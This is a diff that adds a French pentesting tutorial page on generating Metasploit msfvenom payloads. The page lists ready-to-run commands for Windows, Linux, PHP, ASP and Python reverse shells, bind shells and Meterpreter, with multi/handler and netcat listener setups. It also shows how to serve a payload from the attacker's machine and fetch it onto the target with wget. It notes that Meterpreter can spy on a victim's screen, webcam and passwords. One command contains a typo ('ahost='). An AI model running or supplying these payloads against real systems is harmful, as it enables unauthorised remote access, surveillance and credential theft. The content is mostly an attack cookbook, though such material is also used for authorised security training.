@@ -68,6 +68,56 @@
                 <li class="toctree-l2"><a class="reference internal" href="../metasploit_exploits/">Les exploits</a>
                 </li>
                 <li class="toctree-l2 current"><a class="reference internal current" href="./">Les shells</a>
+    <ul class="current">
+    <li class="toctree-l3"><a class="reference internal" href="#generalites">Généralités</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#syntaxe-globale-msfvenom">Syntaxe globale msfvenom</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#telecharger-un-payload-sur-une-machine-cible">Télécharger un payload sur une machine cible</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#executer-une-payload-sur-une-machine-cible">Exécuter une payload sur une machine cible</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#types-de-payload">Types de payload</a>
+        <ul>
+    <li class="toctree-l4"><a class="reference internal" href="#les-payloads-php">Les payloads php</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#linux-executable-and-linkable-format-elf">Linux Executable and Linkable Format (ELF)</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows">Windows</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#php">PHP</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#asp">ASP</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#python">Python</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#le-bind-shell">Le bind shell</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#le-reverse-tcp">Le reverse TCP</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#le-http-payload">Le HTTP payload</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#le-netcat-reverse-shell">Le Netcat Reverse shell</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows-meterpreter">Windows Meterpreter</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows-meterpreter-x64">Windows Meterpreter (x64)</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows-meterpreter-x86">Windows Meterpreter (x86)</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows-reverse-shell">Windows Reverse Shell</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows-reverse-shell-x64">Windows Reverse Shell (x64)</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows-reverse-shell-x86">Windows Reverse Shell (x86)</a>
+    </li>
+    <li class="toctree-l4"><a class="reference internal" href="#windows-reverse-shell-x86-non-staged">Windows Reverse Shell (x86) (Non Staged)</a>
+    </li>
+        </ul>
+    </li>
+    </ul>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="../metasploit_meterpreter/">Les post-exploits</a>
                 </li>
     </ul>
                   </li>
@@ -162,13 +212,117 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
             <div class="section" itemprop="articleBody">
               
-                
+                <h1 id="msfvenom-de-metasploit">MSFVENOM de metasploit</h1>
+<h2 id="generalites">Généralités</h2>
+<p>MSFvenom est un générateur de payload autonome faisant partie de la suite Metasploit. Un payload est un fichier malveillant et son but est d’obtenir des informations sur la machine sur laquelle il est exécuté. Il existe beaucoup de types de payload, en voici un bel assortiment spécialement conçu pour s’adapter à toutes les situations sur une machine Windows. Ici nous pouvons générer des PL shell ou meterpreter mais quelle est la différence ? Un shell c’est basique c’est juste l’invité de commandes, alors qu’un meterpreter lui permet de lancer des commandes bien différentes, tout en conservant l’accès au shell basique. On peut lui demander par exemple d’enregistrer l’écran de la victime, accéder à sa webcam, extraire ses mots de passe et bien plus encore. </p>
+<h2 id="syntaxe-globale-msfvenom">Syntaxe globale msfvenom</h2>
+<pre><code class="language-bash">msfvenom -p &lt;payload&gt; [options]
+</code></pre>
+<h2 id="telecharger-un-payload-sur-une-machine-cible">Télécharger un payload sur une machine cible</h2>
+<p>Une fois qu'on est sur la machine cible, il faut pouvoir lui transmettre la payload. Pour cela il est possible d'utiliser un serveur web.</p>
+<p>Le plus simple étant de générer un serveur web sur la machine attaquante (ayant la payload) via python.</p>
+<pre><code class="language-bash">python3 -m http.server [PORT]
+</code></pre>
+<p>Le port de base est 80 mais il est conseillé d'utiliser un autre port tel que 9000.
+Ainsi on crée un serveur web sur la machine attaquante qui liste l'ensemble des fichiers de la machine attaquante. Il suffit ensuite de télécharger la payload sur la machine cible via la commande wget.</p>
+<pre><code class="language-bash">sudo wget http://&lt;IP&gt;:&lt;PORT&gt;/payload
+</code></pre>
+<h2 id="executer-une-payload-sur-une-machine-cible">Exécuter une payload sur une machine cible</h2>
+<p>Il ne faut pas oublier de changer les droits du fichier exécutable de payload une fois sur la machine cible si on ne peut pas l'éxécuter.</p>
+<pre><code class="language-bash">chmod +x payload
+</code></pre>
+<h2 id="types-de-payload">Types de payload</h2>
+<h3 id="les-payloads-php">Les payloads php</h3>
+<p>/!\ Les payloads php sont générées avec des commentaires. Il faut donc supprimer les commentaires (en utilisant nano par exemple).</p>
+<h3 id="linux-executable-and-linkable-format-elf">Linux Executable and Linkable Format (ELF)</h3>
+<p>Le format .elf est comparable au format .exe de Windows. Il s'agit de fichiers exécutables pour Linux. Cependant, vous devrez peut-être vous assurer qu'ils disposent des droits d'exécution sur la machine cible. Par exemple, une fois que vous avez le fichier shell.elf sur votre machine cible, utilisez la commande chmod +x shell.elf pour accorder les permissions d'exécution. Une fois cela fait, vous pouvez exécuter ce fichier en tapant ./shell.elf sur la ligne de commande de la machine cible.</p>
+<pre><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; /home/kali/Bureau/payload.elf
+</code></pre>
+<h3 id="windows">Windows</h3>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe
+</code></pre>
+<h3 id="php">PHP</h3>
+<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php
+</code></pre>
+<h3 id="asp">ASP</h3>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp
+</code></pre>
+<h3 id="python">Python</h3>
+<pre><code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py
+</code></pre>
+<h3 id="le-bind-shell">Le bind shell</h3>
+<p>Le Bind Shell c’est quand la machine victime se connecte elle-même au Kali. </p>
+<p>Génération du payload :</p>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/bind_tcp -f exe &gt; /home/kali/Bureau/bind.exe
+</code></pre>
+<p>Lancement du listener :</p>
+<pre><code class="language-bash">sudo msfconsole
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp
+msf6 exploit(multi/handler) &gt; set LHOST &lt;IP&gt;
+msf6 exploit(multi/handler) &gt; set LPORT &lt;PORT&gt;
+msf6 exploit(multi/handler) &gt; run
+</code></pre>
+<h3 id="le-reverse-tcp">Le reverse TCP</h3>
+<p>Avec le Reverse TCP c’est le Kali Linux qui écoute sur un port et attends que la victime se connecte.</p>
+<p>Génération du payload :</p>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp lhost= [IP] lport=5555 -f exe &gt; /home/kali/Bureau/reverse_tcp.exe
+</code></pre>
+<p>Lancement du listener :</p>
+<pre><code class="language-bash">sudo msfconsole
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST &lt;IP&gt;
+msf6 exploit(multi/handler) &gt; set LPORT &lt;PORT&gt;
+msf6 exploit(multi/handler) &gt; run
+</code></pre>
+<h3 id="le-http-payload">Le HTTP payload</h3>
+<p>Le HTTP payload permet d’ouvrir une session sur une machine qui aurait ses ports de fermés, en passant par le port 443 ouvert par défaut.</p>
+<p>Génération du payload :</p>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_https lhost= [IP] lport=443 -f exe &gt; /home/kali/Bureau/reverse_https.exe
+</code></pre>
+<p>Lancement du listener :</p>
+<pre><code class="language-bash">sudo msfconsole
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https
+msf6 exploit(multi/handler) &gt; set LHOST &lt;IP&gt;
+msf6 exploit(multi/handler) &gt; set LPORT &lt;PORT&gt;
+msf6 exploit(multi/handler) &gt; run
+</code></pre>
+<h3 id="le-netcat-reverse-shell">Le Netcat Reverse shell</h3>
+<p>Génération du payload :</p>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp ahost= [IP] lport=1111 -f exe &gt; /home/kali/Bureau/ncshell.exe
+</code></pre>
+<p>Lancement du listener :</p>
+<pre><code class="language-bash">nc -lvp 1111
+</code></pre>
+<h3 id="windows-meterpreter">Windows Meterpreter</h3>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre>
+<h3 id="windows-meterpreter-x64">Windows Meterpreter (x64)</h3>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre>
+<h3 id="windows-meterpreter-x86">Windows Meterpreter (x86)</h3>
+<pre><code class="language-bash">msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre>
+<h3 id="windows-reverse-shell">Windows Reverse Shell</h3>
+<pre><code class="language-bash">msfvenom -p windows/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre>
+<h3 id="windows-reverse-shell-x64">Windows Reverse Shell (x64)</h3>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre>
+<h3 id="windows-reverse-shell-x86">Windows Reverse Shell (x86)</h3>
+<pre><code class="language-bash">msfvenom -p windows/x86/shell/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre>
+<h3 id="windows-reverse-shell-x86-non-staged">Windows Reverse Shell (x86) (Non Staged)</h3>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe
+</code></pre>
               
             </div>
           </div><footer>
     <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
         <a href="../metasploit_exploits/" class="btn btn-neutral float-left" title="Les exploits"><span class="icon icon-circle-arrow-left"></span> Previous</a>
-        <a href="../hydra_bases/" class="btn btn-neutral float-right" title="Les bases">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../metasploit_meterpreter/" class="btn btn-neutral float-right" title="Les post-exploits">Next <span class="icon icon-circle-arrow-right"></span></a>
     </div>
 
   <hr/>
@@ -194,7 +348,7 @@
       <span><a href="../metasploit_exploits/" style="color: #fcfcfc">&laquo; Previous</a></span>
     
     
-      <span><a href="../hydra_bases/" style="color: #fcfcfc">Next &raquo;</a></span>
+      <span><a href="../metasploit_meterpreter/" style="color: #fcfcfc">Next &raquo;</a></span>
     
   </span>
 </div>
